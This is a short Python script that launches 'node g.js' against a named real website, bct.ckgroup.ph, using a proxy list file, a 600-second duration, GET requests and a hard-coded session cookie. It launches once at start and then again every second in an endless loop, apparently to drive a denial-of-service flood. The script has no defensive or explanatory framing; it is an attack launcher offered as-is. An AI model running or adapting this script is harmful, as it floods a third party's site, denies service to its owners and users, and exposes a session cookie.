import schedule
import time
import os
import sys

os.system('node g.js http://bct.ckgroup.ph http.txt 600 GET PHPSESSID:9h0m39b2pf1pks44h5iri8rs76')

def job():
    os.system('node g.js http://bct.ckgroup.ph http.txt 600 GET PHPSESSID:9h0m39b2pf1pks44h5iri8rs76')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)